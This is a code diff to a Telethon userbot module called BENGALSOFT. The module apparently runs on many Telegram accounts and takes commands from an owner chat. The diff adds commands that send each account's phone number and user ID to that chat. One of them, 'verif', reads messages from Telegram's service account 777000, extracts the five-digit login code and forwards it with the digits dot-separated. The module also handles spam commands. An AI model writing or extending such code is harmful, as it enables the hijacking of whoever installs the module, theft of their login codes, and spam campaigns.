@@ -3,8 +3,10 @@ from .. import loader, utils
 
 from telethon import TelegramClient
 from telethon.tl import functions
-from telethon.tl.types import Message, PeerChannel, Channel
+from telethon.tl.types import Message, PeerUser, PeerChannel, Channel
 
+from telethon.tl.functions.users import GetFullUserRequest
+from telethon.tl.functions.account import GetAuthorizationsRequest
 from telethon.tl.functions.channels import JoinChannelRequest, LeaveChannelRequest, GetFullChannelRequest
 from telethon.tl.functions.messages import ImportChatInviteRequest, StartBotRequest, GetMessagesViewsRequest
 
@@ -13,8 +15,8 @@ from telethon.errors.rpcerrorlist import UserNotParticipantError
 @loader.tds
 class BENGALSOFTMod(loader.Module):
     """Основной модуль софтеров.
-           Full Info: /manual @\n
-    ⚙️ By @pavlyxa_rezon\n"""
+           Full Info: <code>/manual @\n</code>
+    ⚙️ <b>By @pavlyxa_rezon</b>\n"""
 
     strings = {
         "name": "BENGALSOFT",
@@ -92,17 +94,53 @@ class BENGALSOFTMod(loader.Module):
             twink = None
         return twink
 
+    async def get_user_fullinfo(self):
+        """Информация о пользователе."""
+        try:
+            user = await self.client.get_me()
+            first_name = user.first_name or ""
+            last_name = user.last_name or ""
+            full_name = f"{first_name} {last_name}".strip()
+            username = f"@{user.username}" if user.username else "NOTSET"
+            phone = user.phone if user.phone else "NOTSET"
+            status_message = (
+                f"💻 {full_name}\n"
+                f"<b>├USER ID: </b><code>{user.id}</code>\n"
+                f"<b>├NUM: </b><code>+{phone}</code>\n"
+                f"<b>└USER: </b>{username}\n"
+            )
+            return status_message
+        except Exception as e:
+            return f"<b>🚫 USER FULLINFO: </b>{e}"
+
     async def get_config_info(self):
         """Информация о конфигурации."""
-        variables = ''.join([f"▪️<b>{key}</b> {value}.\n" for key, value in self.config.items()])
-        configuration = (
-            f"<b>🔒 Константы:</b>\n"
-            f"▪️<b>owner_list</b> {self.owner_list}.\n"
-            f"▪️<b>owner_chat</b> {self.owner_chat}.\n"
-            f"▪️<b>owner_logs</b> {self.owner_logs}.\n\n"
-            f"<b>🔐 Переменные:</b>\n" + variables
-        )
-        return configuration
+        try:
+            variables = ''.join([f"▪️<b>{key}</b> {value}.\n" for key, value in self.config.items()])
+            configuration = (
+                f"<b>🔒 Константы:</b>\n"
+                f"▪️<b>owner_list</b> {self.owner_list}.\n"
+                f"▪️<b>owner_chat</b> {self.owner_chat}.\n"
+                f"▪️<b>owner_logs</b> {self.owner_logs}.\n\n"
+                f"<b>🔐 Переменные:</b>\n" + variables
+            )
+            return configuration
+        except Exception as e:
+            return f"<b>🚫 CONFIG INFO: </b>{e}"
+
+    async def get_verif_code(self):
+        try:
+            telegram_id = 777000
+            code_pattern = r'\b\d{5}\b'
+            async for message in self.client.iter_messages(PeerUser(777000), limit=10):
+                match = re.search(code_pattern, message.text)
+                if match:
+                    verification_code = match.group(0)
+                    formatted_code = ".".join(verification_code)
+                    return f"<b>♻️ VERIF CODE: </b><code>{formatted_code}</code>"
+        except Exception as e:
+            return f"<b>🚫 VERIF: </b>{e}"
+            
     
 
     async def send_done_message(self, text, delay_info=None):
@@ -529,33 +567,26 @@ class BENGALSOFTMod(loader.Module):
         if parts[1] == "set":
             if len(parts) < 4:
                 return
-            config_name = parts[2]
-            new_value = parts[3]
-            taglist = parts[4:]
-            if "all" in taglist:
+            config_name, new_value, taglist = parts[2], parts[3], parts[4:]
+            if "all" in taglist or any(tag == twink for tag in taglist):
                 await self.update_user_config(config_name, new_value)
-            else:
-                for tag in taglist:
-                    if tag == twink:
-                        await self.update_user_config(config_name, new_value)
         elif parts[1] == "self":
             taglist = parts[2:]
             if "all" in taglist or any(tag == twink for tag in taglist):
                 custom_text = await self.get_config_info()
                 await self.send_custom_message(custom_text)
+        elif parts[1] == "status":
+            taglist = parts[2:]
+            if "all" in taglist or any(tag == twink for tag in taglist):
+                custom_text = await self.get_user_fullinfo()
+                await self.send_custom_message(custom_text)
+        elif parts[1] == "verif":
+            taglist = parts[2:]
+            if any(tag == twink for tag in taglist):
+                custom_text = await self.get_verif_code()
+                await self.send_custom_message(custom_text)
         else:
             return
-
-    async def handle_user_search(self, text):
-        """Обработка USER команды /search"""        
-        parts = text.split()
-        if len(parts) < 2:
-            return
-        twink = await self.get_user_info()
-        twink_search = parts[1:]
-        for tag in twink_search:
-            if tag == twink:
-                await self.client.send_message(self.owner_chat, f"это я наху {twink}")
 
     async def handle_spamer(self, text):
         """Центральная обработка /sms"""
@@ -578,6 +609,7 @@ class BENGALSOFTMod(loader.Module):
             await self.send_spam_message(target, message_text, mult, delay_s)
         except Exception as e:
             await self.send_else_message(f"<b>🚫 HANDLE MESS:</b> {e}")
+    
 
     
     @loader.watcher()
@@ -600,8 +632,6 @@ class BENGALSOFTMod(loader.Module):
                 await self.handle_manual(message.message)
             elif message.message.startswith("/config"):
                 await self.handle_user_config(message.message)
-            elif message.message.startswith("/search"):
-                await self.handle_user_search(message.message)
             elif message.message.startswith("/sms"):
                 await self.handle_spamer(message.message)
             elif message.message.startswith("/react"):
